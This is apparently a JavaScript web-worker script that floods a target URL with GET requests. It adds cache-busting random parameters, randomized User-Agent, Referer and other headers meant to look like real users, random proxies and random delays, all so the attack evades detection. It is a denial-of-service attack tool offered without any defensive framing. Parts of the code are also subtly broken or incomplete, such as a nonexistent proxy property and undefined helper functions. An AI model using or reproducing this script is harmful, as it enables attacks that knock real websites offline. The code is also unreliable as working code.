// Listen for messages from the main script
self.onmessage = function(event) {
    // Extract target URL, number of requests, and proxy servers from the message
    let targetURL = event.data.targetURL;
    let numRequests = event.data.numRequests;
    let proxies = event.data.proxies;

    // Send requests to the target URL
    for (let i = 0; i < numRequests; i++) {
        setTimeout(() => {
            // Create an XMLHttpRequest object
            let xhr = new XMLHttpRequest();
            
            // Generate a random parameter to bypass caching and make requests indistinguishable
            let randomParam = "param" + Math.floor(Math.random() * 1000000);

            // Set up the request
            xhr.open("GET", targetURL + "?" + randomParam, true);
            
            // Randomize request headers to mimic legitimate user behavior
            xhr.setRequestHeader("User-Agent", getRandomUserAgent());
            xhr.setRequestHeader("Accept-Language", getRandomLanguage());
            xhr.setRequestHeader("Referer", getRandomReferer());
            xhr.setRequestHeader("Accept-Encoding", getRandomEncoding());
            
            // Use a random proxy server if available
            if (proxies.length > 0) {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                xhr.proxy = proxy;
            }
            
            // Send the request
            xhr.send();
        }, Math.random() * 5000); // Introduce random delays between requests (up to 5 seconds)
    }
}
